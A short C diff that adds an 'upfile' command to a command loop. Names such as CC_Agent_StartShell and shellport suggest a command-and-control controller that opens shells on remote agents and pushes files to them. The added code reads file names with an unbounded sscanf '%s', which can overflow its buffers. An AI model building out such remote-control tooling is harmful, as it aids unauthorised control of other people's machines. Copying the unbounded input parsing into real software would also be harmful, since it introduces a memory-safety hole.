@@ -137,6 +137,13 @@ int whileMain(){
             
             CC_Agent_StartShell(agentnow,shellport,200,10000);
         }
+        else if(startWith(line,"upfile")){
+            char from_lfile[MAX_FILE_NAME_LEN];
+            char to_rfile[MAX_FILE_NAME_LEN];
+            sscanf(line,"upfile %s %s",from_lfile,to_rfile);
+            Printf_OK("From ->(%s),To -> (%s)",from_lfile,to_rfile);
+            CC_Agent_Upfile(agentnow,from_lfile,to_rfile);
+        }
         else{
             Printf_OK("unknow cmd");
             Printf_OK("%s",line);
